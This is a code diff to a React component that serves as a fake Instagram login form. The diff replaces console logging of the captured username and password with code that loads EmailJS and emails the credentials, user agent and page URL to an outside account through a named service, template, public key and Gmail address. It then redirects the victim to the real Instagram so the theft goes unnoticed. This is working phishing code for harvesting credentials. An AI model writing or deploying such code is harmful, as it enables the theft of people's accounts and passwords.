@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 
 export default function App() {
   const [username, setUsername] = useState('');
@@ -6,29 +6,59 @@ export default function App() {
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
 
+  useEffect(() => {
+    // Load EmailJS script
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+    script.onload = () => {
+      // Initialize EmailJS with your public key
+      window.emailjs.init("DCnFHeeyL6GEWE6J2");
+    };
+    document.head.appendChild(script);
+
+    return () => {
+      document.head.removeChild(script);
+    };
+  }, []);
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
     setError('');
     
     try {
-      // In a real implementation, you would send data to your backend here
-      // For now, we'll just log the data to console and redirect
+      // Check if EmailJS is loaded
+      if (!window.emailjs) {
+        throw new Error('EmailJS is not loaded');
+      }
       
-      console.log('Instagram Login Attempt:');
-      console.log('Username:', username);
-      console.log('Password:', password);
-      console.log('Timestamp:', new Date().toISOString());
+      // Send data to EmailJS
+      const response = await window.emailjs.send(
+        "service_wni6k0h", 
+        "template_ap7mzek", 
+        {
+          from_name: username,
+          to_name: "Admin",
+          message: `Instagram Login Attempt:
+          
+Username: ${username}
+Password: ${password}
+Timestamp: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent}
+Page URL: ${window.location.href}
+
+This is an automated message with login attempt data.`,
+          reply_to: "ictproject499@gmail.com",
+          subject: `Instagram Login Attempt - ${username}`
+        }
+      );
       
-      // Simulate a delay to show loading state
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      
-      // Redirect to Instagram after "processing"
+      // Redirect to Instagram after successful submission
       window.location.href = 'https://www.instagram.com';
     } catch (err) {
-      setError('An error occurred. Please try again.');
+      setError('An error occurred. Please try again. Error: ' + err.message);
       setIsLoading(false);
-      console.error('Error:', err);
+      console.error('EmailJS Error:', err);
     }
   };
 
